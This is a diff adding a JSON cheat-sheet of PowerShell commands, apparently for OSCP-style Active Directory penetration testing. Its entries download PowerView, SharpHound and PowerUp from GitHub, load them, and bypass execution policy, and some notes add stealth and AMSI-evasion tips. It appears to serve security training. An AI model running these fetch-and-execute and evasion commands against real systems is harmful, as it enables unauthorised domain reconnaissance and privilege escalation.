@@ -1,0 +1,301 @@
+{
+  "category": "active-directory",
+  "description": "PowerShell module import commands for Active Directory enumeration and privilege escalation tools (PowerView, SharpHound, PowerUp)",
+  "commands": [
+    {
+      "id": "download-powerview",
+      "name": "Download PowerView from GitHub",
+      "category": "enumeration",
+      "command": "iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1",
+      "description": "Download PowerView.ps1 from PowerSploit repository to current directory",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "POWERSHELL",
+        "DOWNLOAD",
+        "POWERVIEW",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "iwr": "Invoke-WebRequest (PowerShell 3.0+) - downloads files from web",
+        "-Uri": "Source URL for the file to download",
+        "-OutFile": "Local file path to save downloaded content"
+      },
+      "success_indicators": [
+        "PowerView.ps1 created in current directory",
+        "File size > 700KB"
+      ],
+      "failure_indicators": [
+        "Unable to connect to the remote server",
+        "Access Denied",
+        "Execution Policy"
+      ],
+      "next_steps": [
+        "import-powerview"
+      ],
+      "alternatives": [
+        "curl-download-powerview"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Execution Policy Error": "Set-ExecutionPolicy Bypass -Scope Process -Force",
+        "Unable to connect": "Check network connectivity or firewall. Alternative: Transfer via SMB or HTTP server",
+        "TLS/SSL Error": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
+      },
+      "notes": "PowerView is the most widely-used PowerShell tool for Active Directory enumeration. Part of PowerSploit framework. For OSCP exam environments without internet, transfer PowerView.ps1 via file-transfer techniques (SMB, HTTP, base64). Always verify file integrity after download.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "curl-download-powerview",
+      "name": "Download PowerView using curl",
+      "category": "enumeration",
+      "command": "curl -o PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1",
+      "description": "Download PowerView.ps1 using curl command (alternative method)",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "POWERSHELL",
+        "DOWNLOAD",
+        "POWERVIEW",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "-o": "Output file name for downloaded content"
+      },
+      "success_indicators": [
+        "PowerView.ps1 saved",
+        "100% downloaded"
+      ],
+      "failure_indicators": [
+        "Could not resolve host",
+        "Failed to connect"
+      ],
+      "next_steps": [
+        "import-powerview"
+      ],
+      "alternatives": [
+        "download-powerview"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "curl not found": "Use PowerShell iwr instead: download-powerview",
+        "SSL certificate problem": "curl -k -o PowerView.ps1 <URL> (insecure, verify file after)"
+      },
+      "notes": "curl is available on Windows 10 1803+ and Windows Server 2019+. For older systems, use PowerShell's Invoke-WebRequest (download-powerview) or certutil.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "download-sharphound",
+      "name": "Download SharpHound from GitHub",
+      "category": "enumeration",
+      "command": "iwr -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile SharpHound.ps1",
+      "description": "Download SharpHound.ps1 PowerShell collector for BloodHound from official repository",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "POWERSHELL",
+        "BLOODHOUND",
+        "SHARPHOUND",
+        "DOWNLOAD",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "iwr": "Invoke-WebRequest cmdlet for downloading files",
+        "-Uri": "Source URL for SharpHound.ps1",
+        "-OutFile": "Output file path"
+      },
+      "success_indicators": [
+        "SharpHound.ps1 created",
+        "File downloaded successfully"
+      ],
+      "failure_indicators": [
+        "Unable to connect",
+        "404 Not Found",
+        "Execution Policy"
+      ],
+      "next_steps": [
+        "import-sharphound"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "troubleshooting": {
+        "TLS Error": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
+        "Execution Policy": "Set-ExecutionPolicy Bypass -Scope Process -Force",
+        "404 Error": "GitHub URL may have changed. Check BloodHound repository for current path or download SharpHound.exe instead"
+      },
+      "notes": "SharpHound is the official data collector for BloodHound. Collects AD objects, permissions, sessions, and relationships. PowerShell version (SharpHound.ps1) is easier to transfer but more detectable. For OSCP: SharpHound.exe (compiled) is preferred for stealth. Transfer to target via file-transfer techniques if no internet access.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "import-sharphound",
+      "name": "Import SharpHound Module",
+      "category": "enumeration",
+      "command": ". .\\SharpHound.ps1",
+      "description": "Import SharpHound PowerShell module for BloodHound data collection",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "POWERSHELL",
+        "BLOODHOUND",
+        "SHARPHOUND",
+        "IMPORT",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        ". (dot-source)": "Execute script in current scope, loading Invoke-BloodHound function"
+      },
+      "success_indicators": [
+        "No errors displayed",
+        "Invoke-BloodHound command available",
+        "Module loaded successfully"
+      ],
+      "failure_indicators": [
+        "File not found",
+        "Execution policy error",
+        "Access Denied"
+      ],
+      "next_steps": [],
+      "alternatives": [],
+      "prerequisites": [
+        "download-sharphound"
+      ],
+      "troubleshooting": {
+        "Execution Policy Error": "Set-ExecutionPolicy Bypass -Scope Process -Force",
+        "File not found": "Verify SharpHound.ps1 in current directory: ls SharpHound.ps1",
+        "Module not recognized": "Re-import after fixing execution policy",
+        "AMSI Detection": "Use SharpHound.exe compiled binary instead for better AMSI evasion"
+      },
+      "notes": "After importing, use Invoke-BloodHound to collect data. SharpHound generates ZIP file containing JSON data for BloodHound analysis. Noisy on network - creates many LDAP queries and SMB connections. OSCP: SharpHound valuable for understanding AD attack paths but manual enumeration also required.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "download-powerup",
+      "name": "Download PowerUp from GitHub",
+      "category": "post-exploit",
+      "command": "iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -OutFile PowerUp.ps1",
+      "description": "Download PowerUp.ps1 privilege escalation enumeration tool from PowerSploit repository",
+      "tags": [
+        "PRIVILEGE_ESCALATION",
+        "POWERSHELL",
+        "POWERUP",
+        "DOWNLOAD",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "iwr": "Invoke-WebRequest for downloading files",
+        "-Uri": "Source URL for PowerUp.ps1",
+        "-OutFile": "Local file path to save"
+      },
+      "success_indicators": [
+        "PowerUp.ps1 created",
+        "File size > 500KB"
+      ],
+      "failure_indicators": [
+        "Unable to connect",
+        "Execution Policy error",
+        "Access Denied"
+      ],
+      "next_steps": [
+        "import-powerup"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "troubleshooting": {
+        "TLS Error": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
+        "Execution Policy": "Set-ExecutionPolicy Bypass -Scope Process -Force",
+        "No internet access": "Transfer PowerUp.ps1 via SMB, HTTP, or base64 encoding"
+      },
+      "notes": "PowerUp automates Windows privilege escalation enumeration. Checks for service misconfigurations, unquoted service paths, modifiable service binaries, AlwaysInstallElevated, DLL hijacking, and more. Essential tool for Windows post-exploitation. OSCP: Always run PowerUp after gaining initial access to Windows system.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "set-executionpolicy-bypass",
+      "name": "Bypass PowerShell Execution Policy",
+      "category": "post-exploit",
+      "command": "Set-ExecutionPolicy Bypass -Scope Process -Force",
+      "description": "Temporarily bypass PowerShell execution policy for current process to allow script execution",
+      "tags": [
+        "POWERSHELL",
+        "EXECUTION_POLICY",
+        "BYPASS",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "Set-ExecutionPolicy": "Changes user preference for PowerShell execution policy",
+        "Bypass": "No restrictions - all scripts run without prompts or warnings",
+        "-Scope Process": "Apply only to current PowerShell process (no permanent system changes)",
+        "-Force": "Suppress confirmation prompts"
+      },
+      "success_indicators": [
+        "No output (silent success)",
+        "Scripts now import without errors"
+      ],
+      "failure_indicators": [
+        "Access Denied (requires admin for machine/user scope)",
+        "Execution policy error persists"
+      ],
+      "next_steps": [
+        "import-powerview",
+        "import-powerup",
+        "import-sharphound"
+      ],
+      "alternatives": [
+        "powershell-ep-bypass-flag"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Access Denied": "You don't need admin for -Scope Process. Verify you used -Scope Process flag",
+        "Still blocked": "Launch new PowerShell with: powershell -ep bypass -nop",
+        "AMSI Blocking": "Execution policy set but AMSI still blocks. Different issue - need AMSI bypass"
+      },
+      "notes": "Windows execution policy is NOT a security boundary - it's a safety feature to prevent accidental script execution. -Scope Process applies only to current PowerShell window and resets when window closes. Does not require administrator privileges. OSCP: Always run this first when importing PowerShell scripts. Alternative: Launch PowerShell with 'powershell -ep bypass' flag instead of using Set-ExecutionPolicy.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "powershell-ep-bypass-flag",
+      "name": "Launch PowerShell with Execution Policy Bypass",
+      "category": "post-exploit",
+      "command": "powershell -ep bypass -nop",
+      "description": "Start new PowerShell session with execution policy bypassed and no profile loading",
+      "tags": [
+        "POWERSHELL",
+        "EXECUTION_POLICY",
+        "BYPASS",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "-ep bypass": "Execution Policy Bypass - allow all scripts to run",
+        "-nop": "NoProfile - don't load PowerShell profile scripts (faster startup, cleaner environment)"
+      },
+      "success_indicators": [
+        "PowerShell prompt appears",
+        "No execution policy errors"
+      ],
+      "failure_indicators": [
+        "Command not found",
+        "Access Denied"
+      ],
+      "next_steps": [
+        "import-powerview",
+        "import-powerup",
+        "import-sharphound"
+      ],
+      "alternatives": [
+        "set-executionpolicy-bypass"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Command not recognized": "Use full path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass",
+        "Still blocked": "Try Set-ExecutionPolicy Bypass -Scope Process instead from within PowerShell"
+      },
+      "notes": "This method bypasses execution policy at launch rather than changing it after launch. -nop prevents profile scripts from running which can interfere with imported modules. Preferred method for clean PowerShell environment. OSCP: Use this when launching PowerShell from command shell (cmd.exe) or after gaining code execution.",
+      "oscp_relevance": "high"
+    }
+  ]
+}
